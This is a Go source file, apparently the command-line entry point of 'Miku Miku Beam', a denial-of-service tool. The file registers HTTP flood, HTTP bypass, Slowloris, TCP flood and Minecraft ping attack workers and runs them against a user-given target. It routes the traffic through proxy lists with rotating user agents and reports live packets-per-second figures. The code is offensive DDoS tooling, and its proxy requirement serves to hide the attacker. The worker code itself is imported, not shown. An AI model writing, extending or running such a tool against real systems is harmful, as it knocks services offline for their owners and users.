package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/rs/zerolog"
	"github.com/spf13/cobra"

	mc "github.com/sammwyy/mikumikubeam/internal/attacks/game"
	"github.com/sammwyy/mikumikubeam/internal/attacks/http"
	tcp "github.com/sammwyy/mikumikubeam/internal/attacks/tcp"
	"github.com/sammwyy/mikumikubeam/internal/config"
	"github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/proxy"
	targetpkg "github.com/sammwyy/mikumikubeam/pkg/target"
)

func main() {
	zerolog.TimeFieldFormat = time.RFC3339
	root := &cobra.Command{Use: "mmb", Short: "Miku Miku Beam CLI"}
	// Do not print extra JSON error logs on usage errors; let Cobra show help/error
	root.SilenceErrors = true

	cfgPath := root.PersistentFlags().String("config", "", "Path to config file (TOML)")

	attackCmd := &cobra.Command{Use: "attack [method] [target]", Short: "Launch an attack", Args: cobra.ExactArgs(2), Example: "mmb attack http_flood http://example.com"}
	// Do not show usage on runtime errors like missing proxies
	attackCmd.SilenceUsage = true
	var duration int
	var delay int
	var psize int
	var noProxy bool
	var threads int
	var verbose bool
	// method and target are positional
	attackCmd.Flags().IntVar(&duration, "duration", 60, "Duration in seconds")
	attackCmd.Flags().IntVar(&delay, "delay", 500, "Packet delay in ms")
	attackCmd.Flags().IntVar(&psize, "packet-size", 512, "Packet size")
	attackCmd.Flags().BoolVar(&noProxy, "no-proxy", false, "Allow running without proxies")
	attackCmd.Flags().IntVar(&threads, "threads", 0, "Number of threads (0=NumCPU)")
	attackCmd.Flags().BoolVar(&verbose, "verbose", false, "Show detailed attack logs")
	// no required flags; fail on missing args via cobra.ExactArgs

	attackCmd.RunE = func(cmd *cobra.Command, args []string) error {
		method := args[0]
		target := args[1]
		cfg, _ := config.Load(*cfgPath)
		proxies, _ := proxy.LoadProxies(cfg.ProxiesFile)
		uas, _ := proxy.LoadUserAgents(cfg.UserAgentsFile)

		reg := engine.NewRegistry()
		reg.Register(engine.AttackHTTPFlood, http.NewFloodWorker())
		reg.Register(engine.AttackHTTPBypass, http.NewBypassWorker())
		reg.Register(engine.AttackHTTPSlowloris, http.NewSlowlorisWorker())
		reg.Register(engine.AttackTCPFlood, tcp.NewFloodWorker())
		reg.Register(engine.AttackMinecraftPing, mc.NewPingWorker())

		eng := engine.NewEngine(*reg)

		kind := engine.AttackKind(strings.ToLower(method))
		filtered := proxy.FilterByMethod(proxies, kind)
		if len(filtered) == 0 && !noProxy {
			color.Red("No proxies available (file: %s). Use --no-proxy to proceed.", cfg.ProxiesFile)
			return fmt.Errorf("no proxies available")
		}

		tn, _ := targetpkg.Parse(target)
		params := engine.AttackParams{
			Target:      target,
			TargetNode:  tn,
			Duration:    time.Duration(duration) * time.Second,
			PacketDelay: time.Duration(delay) * time.Millisecond,
			PacketSize:  psize,
			Method:      kind,
			Threads:     threads,
			Verbose:     verbose,
		}

		ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
		defer stop()

		attackID := fmt.Sprintf("cli-%d", time.Now().Unix())
		statsCh, _ := eng.Start(attackID, ctx, params, filtered, uas)
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		color.Cyan("Starting %s against %s with %d proxies", method, target, len(filtered))
		if verbose {
			color.Yellow("Verbose mode enabled - showing detailed attack logs")
		}
		for {
			select {
			case <-ctx.Done():
				color.Yellow("Stopping...")
				eng.Stop(attackID)
				return nil
			case s := <-statsCh:
				// print every receipt; throttle visually with ticker
				<-ticker.C
				if s.Log != "" && verbose {
					// Show detailed logs only in verbose mode
					fmt.Printf("%s PPS:%s Total:%s Proxies:%d %s\n",
						color.HiBlackString(s.Timestamp.Format("15:04:05")),
						color.GreenString("%d", s.PacketsPerS),
						color.BlueString("%d", s.TotalPackets),
						s.Proxies,
						s.Log,
					)
				} else {
					// Clean stats display without logs
					fmt.Printf("%s PPS:%s Total:%s Proxies:%d\n",
						color.HiBlackString(s.Timestamp.Format("15:04:05")),
						color.GreenString("%d", s.PacketsPerS),
						color.BlueString("%d", s.TotalPackets),
						s.Proxies,
					)
				}
			}
		}
	}

	root.AddCommand(attackCmd)

	if err := root.Execute(); err != nil {
		// Exit with a standard non-zero code for CLI usage errors without extra logging
		os.Exit(2)
	}
}
